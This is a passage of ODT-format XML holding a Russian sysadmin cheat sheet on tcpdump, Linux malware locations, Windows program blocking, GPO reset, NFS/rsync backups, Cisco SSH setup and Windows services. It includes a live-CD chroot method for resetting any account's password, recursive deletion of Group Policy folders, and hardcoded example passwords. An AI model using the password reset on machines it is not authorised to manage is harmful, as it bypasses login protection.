      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">tcpdump -vvv -s 0 -l -n port 53 # </text:span><text:span text:style-name="T1">показываем</text:span><text:span text:style-name="T3"> DNS </text:span><text:span text:style-name="T1">трафик</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">tcpdump -nl -i bge0 not port ssh and src \(192.168.16.121 or 192.168.16.54\)</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">tcpdump -n -i eth1 net 192.168.16.121 # Выборка входящий/исходящий по одному IP адресу</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">tcpdump -n -i eth1 net 192.168.16.0/24 # Выборка входящий/исходящий по адресу сети</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T1">tcpdump -l &gt; dump &amp;&amp; tail -f dump # Вывод через буфер</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T1">tcpdump -i rl0 -w traffic.rl0 # Писать заголовки в бинарный файл</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">tcpdump -i rl0 -s 0 -w traffic.rl0 # Писать в бинарный фйл полные пакеты</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">tcpdump -r traffic.rl0 # Прочитать из файла (так-же для ethereal</text:span></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3">tcpdump -i eth0 -s 0 -A port 80 | grep GET <text:s text:c="5"/># -s 0 </text:span><text:span text:style-name="T1">для</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">полных</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">пакетов</text:span><text:span text:style-name="T3">, -A </text:span><text:span text:style-name="T1">для</text:span><text:span text:style-name="T3"> ASCII</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Где искать вредоносный код в linux</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">var</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">at</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">tabs</text:span><text:span text:style-name="T1">/&lt;</text:span><text:span text:style-name="T3">username</text:span><text:span text:style-name="T1">&gt; /</text:span><text:span text:style-name="T3">etc</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">ttys</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">etc</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">pro</text:span><text:span text:style-name="T1">ﬁ</text:span><text:span text:style-name="T3">le</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">etc</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">bashrc</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">etc</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">csh</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">cshrc</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">etc</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">csh</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">login</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">etc</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">rc</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">common</text:span><text:span text:style-name="T1"> ~/.</text:span><text:span text:style-name="T3">pro</text:span><text:span text:style-name="T1">ﬁ</text:span><text:span text:style-name="T3">le</text:span><text:span text:style-name="T1"> ~/.</text:span><text:span text:style-name="T3">bashrc</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">home</text:span><text:span text:style-name="T1">/&lt;</text:span><text:span text:style-name="T3">username</text:span><text:span text:style-name="T1">&gt;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Сброс</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">пароля</text:span><text:span text:style-name="T3"> Reset Password Unix, FreeBSD, Linux, Debian, ASP linux</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Основой способ для любых unix:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">!!! получится если системный раздел не зашифрован</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">0. Загружаемся с livecd </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Например</text:span><text:span text:style-name="T3">: debian live cd, ubuntu live, <text:s/>systemrescue </text:span><text:span text:style-name="T1">и</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">т</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T1">д</text:span><text:span text:style-name="T3">.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">https://www.system-rescue.org/</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">1. После загрузки определяемся с дисками</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">fdisk -l </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">lsblk</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">2. Монтируем раздел системы</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">mount /dev/sda1 /mnt</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">3. Выполняем смену корня</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">chroot /mnt</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">4. Выполняем смену пароля</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">passwd user</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">5. Выходим chroot и загружаемся в систему</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Ctrl+d</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">reboot</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Больше способов https://bookflow.ru/sbros-parolya-reset-password-unix-freebsd-linux-debian-asp-linux/</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Запрет</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">запуска</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">приложения</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">через</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">реестр</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Windows Registry Editor Version 5.00 [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">“DisallowRun”=dword:00000001</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun]</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">“1″=”программа.exe”</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">“2″=”другая_программа.exe”</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">GPO Запрет запуска приложения через gpedit</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Пользовательские настройки -&gt; Административные шаблоны -&gt; Система</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T1">Чтобы ограничить определенные программы, выберите команду "Запускать только указанные программы Windows". Чтобы заблокировать </text:span><text:soft-page-break/><text:span text:style-name="T1">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3"><text:span text:style-name="T1">Сделать это можно следующими командами, запущенными в командной строке с правами администратора:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">RD /S /Q "%WinDir%\System32\GroupPolicyUsers" </text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">RD /S /Q "%WinDir%\System32\GroupPolicy" </text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3">gpupdate /force</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Как</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">найти</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">дублирующийся</text:span><text:span text:style-name="T3"> SID </text:span><text:span text:style-name="T1">в</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">домене</text:span><text:span text:style-name="T3"> Active Directory</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">0. Ntdsutil - запускаем программу на DC</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">1. В ней выполняем: </text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">security account management - </text:span><text:span text:style-name="T1">нажимаем</text:span><text:span text:style-name="T3"> Enter</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">connect to server </text:span><text:span text:style-name="T1">ИМЯ</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T1">СЕРВЕРА</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T1">КОНТРОЛЛЕРА</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T1">ДОМЕНА</text:span><text:span text:style-name="T3"> - </text:span><text:span text:style-name="T1">вновь</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">нажимаем</text:span><text:span text:style-name="T3"> Enter.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">check duplicate sid - в очередной раз нажимаем Enter. </text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">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3">C:\Windows\system32.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">NFS \ Rsync \ Backup</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">NFS </text:span><text:span text:style-name="T1">сервер</text:span><text:span text:style-name="T3">:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">на</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">сервер</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">ставим</text:span><text:span text:style-name="T3"> apt-get install nfs-kernel-server nfs-common portmap</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">/usr/allbackup тут все будут бэкапы</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">nano /etc/exports тут ставим какие нужны каталоги</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">/usr/allbackup/name_catalog ip_clienta(rw,sync,no_root_squash,no_subtree_check)</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">применить команду exportfs -a</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">NFS на клиенте:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">apt-get install nfs-common portmap rsync</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">mkdir /nfs/name_catalog -p</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">nano /etc/fstab</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3">ip_server:/usr/allbackup/name_catalog /nfs/name_catalog nfs rw,sync,hard,intr 0 0</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Создаем каталоги для бэкапа:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">mkdir -p /root/backup/{www,etc,sql}</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Скрипт для бэкапа:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">touch /root/backupwww</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">#!/bin/bash</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">#[Changes Directory]</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">cd /root/backup</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">#[Stamps the file name with a date]</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">TIMESTAMP=date +%m-%d-%y-%H%M</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">#[DB Backup Scripts]</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:soft-page-break/><text:span text:style-name="T3"># DB Name</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">HOST=localhost</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">DBNAME="basename"</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">USER="username"</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">PASSWORD="password"</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P3" loext:marker-style-name="T2"><text:span text:style-name="T3">DUMP_PATH=/root/backup/sql</text:span></text:p>
      <text:p text:style-name="P3" loext:marker-style-name="T2"><text:span text:style-name="T3">BACK_PATH=/root/backup/www</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">BACK_PATH3=/root/backup/etc</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">#dbname</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">mysqldump --opt -c -e -Q -h$HOST -u$USER -p$PASSWORD $DBNAME &gt; $DBNAME.sql</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">tar czpf $DUMP_PATH/$DBNAME.$TIMESTAMP.tar.gz $DBNAME.sql</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">rm -f $DBNAME.sql</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">#Backing up files</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">tar cvzpf $BACK_PATH/www.$TIMESTAMP.tar.gz --same-owner <text:s/>--exclude=/var/www/site/gruzims/* /var/www</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3">tar cvzpf $BACK_PATH3/etc.$TIMESTAMP.tar.gz /etc</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">C</text:span><text:span text:style-name="T1">крипт</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">стиралки</text:span><text:span text:style-name="T3">:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">touch /root/delbackup</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">#!/bin/bash</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">cd /var/backup/</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">find /var/backup/mysql -name "*.tar.gz" -mtime +30 |xargs /bin/rm -f {};</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3">find /var/backup/www -name "*.tar.gz" -mtime +30 |xargs /bin/rm -f {};</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Настройка</text:span><text:span text:style-name="T3"> crontab:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">crontab -e </text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">0 5 * * * /usr/bin/rsync -a /root/ /nfs/folder </text:span><text:span text:style-name="T1">синхронизируем</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">бэкапы</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">на</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">сервер</text:span><text:span text:style-name="T3"> nfs</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">0 2 * * * /root/backupwww скрипт бэкапа</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Как настроить SSH на Cisco</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Заходим в привилегированный режим;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">cisco&gt;enable</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Устанавливаем дату и время (нужны для генерации ключа);</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T1">cisco#clock set 09:02:13 27 Apr 2022</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T1">Входим в режим конфигурирования;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">cisco#conf t</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Указываем домен и имя устройства (для генерации ключа);</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">cisco(config)#ip domain name domain.local</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">cisco(config)#hostname cisco-ssh</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Генерируем</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">ключ</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">для</text:span><text:span text:style-name="T3"> SSH;</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">cisco-ssh(config)#crypto key generate rsa</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Храним пароли в зашифрованном виде;</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">cisco-ssh(config)#service password-encryption</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">Создаем пользователя admin с паролем Pa$$w0rd и максимальными привилегиями;</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">cisco-ssh(config)#username admin privilege 15 secret Pa$$w0rd</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Задаем пароль для привилегированного режима;</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">cisco-ssh(config)#enable secret Pa$$w0rd</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Активируем</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">протокол</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">ААА</text:span><text:span text:style-name="T3">;</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">cisco-ssh(config)#aaa new-model</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Разрешаем компьютерам внутренней сети заходить на Cisco по SSH;</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">cisco-ssh(config)#access-list 23 permit 192.168.0.0 0.0.0.255</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Входим в режим конфигурирования терминальный линий;</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">cisco-ssh(config)#line vty 0 4</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Запрещаем</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">все</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T1">кроме</text:span><text:span text:style-name="T3"> SSH;</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">cisco-ssh(config-line)#transport input ssh</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Активируем автоматическое поднятие строки после ответа системы на проделанные изменения;</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">cisco-ssh(config-line)#logging synchronous</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Позволяем входить сразу в привилигированный режим;</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">cisco-ssh(config-line)#privilege level 15</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Настраиваем автоматическое закрытие SSH сессии через 60 минут;</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">cisco-ssh(config-line)#exec-timeout 60 0</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Привязываем группу доступа, созданную на шаге 10, к терминальной линии;</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">cisco-ssh(config-line)#access-class 23 in</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Выходим из настроек и сохраняем конфигурацию.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">cisco(config-line)exit</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">cisco(config)exit</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3">cisco#copy run start</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Службы</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T1">Сервисы</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Управление службами:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">sc getkeyname "ХХХХХ" - получишь ид сервиса</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">sc queryex "ХХХХХ" - узнаешь по ид все о сервисе</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">0) Основным инструментом для управления службами в графическом режиме является консоль services.msc </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">- <text:s/>«Пуск» -&gt; «Панель управления» -&gt; «Администрирование»</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">1) Управление службами из командной строки с помощью утилиты net.exe</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">net start service_name</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P3" loext:marker-style-name="T2"><text:span text:style-name="T3">net stop service_name</text:span></text:p>
      <text:p text:style-name="P3" loext:marker-style-name="T2"><text:span text:style-name="T1">2) </text:span><text:span text:style-name="T3">sc</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">exe</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">sc.exe stop DNSCache - остановить службу DNSCache на локальном компьютере</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">sc \\SERVER_NAME query DNSCache - опросить состояние службы DNSCache на компьютере SERVER_NAME</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">sc \\SERVER_NAME start DNSCache - </text:span><text:span text:style-name="T1">запустить</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">службу</text:span><text:span text:style-name="T3"> DNSCache </text:span><text:span text:style-name="T1">на</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">компьютере</text:span><text:span text:style-name="T3"> SERVER_NAME</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:soft-page-break/><text:span text:style-name="T3">sc config "service name" start= "</text:span><text:span text:style-name="T1">параметры</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">запуска</text:span><text:span text:style-name="T3">"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># параметры запуска:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># auto (автоматически)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># demand (вручную)</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># disabled (</text:span><text:span text:style-name="T1">отключена</text:span><text:span text:style-name="T3">)</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">sc [Servername] create Servicename [Optionname= Optionvalue... - </text:span><text:span text:style-name="T1">создание</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">службы</text:span></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3">sc delete "name_service" - </text:span><text:span text:style-name="T1">удаление</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">службы</text:span><text:span text:style-name="T3"> (!!!)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Основные службы windows:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">w32time - служба времени</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">csrss.exe - Client Server Runtime Process - важный компонент, он обрабатывает пользовательский режим блока подсистемы Win32. (обычная мишень для вирусов)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">explorer.exe - Проводник, Рабочий стол и меню Пуск. Если в этой программе происходят сбои, то Windows обычно автоматически снова запускает ее.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">lsass.exe - подсистема несет ответственность за аутентификацию пользователей в вашей системе</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">rundll32.exe - программа, запуск функции в Динамически подключаемой библиотек, является загрузчиком для других программ</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">services.exe - запускает службы, которые являются автономными процессами</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">smss.exe - важный компонент Windows (еще он запускает из ветки реестра HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">spoolsv.exe - (известная как spooler) программа занимается процессами печати и организации очередей печати </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">svchost.exe - приложение несет ответственность за запуск большинства служб</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">System - системный процесс (ntoskrnl.ехе), основной компонент Windows</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">System Idle Process - «незанятый» процесс - 16-килобайтный цикл, используемый, чтобы занять не используемые все циклы центрального процессора</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">wmlprvse.exe - поддержка инструментальных средств управления средой Windows (WMI), также известен как Управление предприятием на основе веб-технологий (WBEM)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T1">Dmwappushservice - служба маршрутизации пуш-сообщений WAP, один из так называемых элементов слежки Microsoft.</text:span></text:p>
      <text:p text:style-name="P3"><text:soft-page-break/><text:span text:style-name="T1">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text:span text:style-name="T1">Superfetch - может быть отключена, если в качестве системного диска используется SSD.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
